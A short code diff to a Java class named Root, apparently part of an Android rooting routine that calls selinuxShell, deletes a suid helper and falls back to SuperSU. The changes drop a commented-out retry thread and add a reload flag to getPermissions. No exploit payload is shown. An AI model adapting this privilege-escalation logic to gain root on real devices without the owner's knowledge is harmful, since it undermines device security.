@@ -263,22 +263,6 @@ public class Root {
 			}
 
 			selinuxShell();
-
-			/*Thread thread = new Thread(new Runnable() {
-				public void run() {
-					selinuxShell();
-				}
-			});
-			thread.start();
-
-			for(int i = 0; i< 10; i++) {
-				Utils.sleep(5000);
-
-				if (PackageInfo.checkRoot()) {
-					Status.self().setReload();
-					break;
-				}
-			}*/
 		}
 	}
 
@@ -301,10 +285,6 @@ public class Root {
 			}
 
 			suidext.delete();
-
-			if (PackageInfo.checkRoot()) {
-				Status.self().setReload();
-			}
 
 		} catch (final Exception e1) {
 			if (Cfg.EXCEPTION) {
@@ -613,7 +593,7 @@ public class Root {
 	 * will happen on sequence, while using the semaphore only one will
 	 * succeed.
 	 */
-	static public boolean getPermissions() {
+	static public boolean getPermissions(boolean reload) {
 
 		// Abbiamo su?
 		Status.setSu(PackageInfo.hasSu());
@@ -646,7 +626,7 @@ public class Root {
 				// Ask the user...
 				Root.supersuRoot();
 
-				if (PackageInfo.checkRoot()) {
+				if (PackageInfo.checkRoot() && reload) {
 					Status.self().setReload();
 				}
 
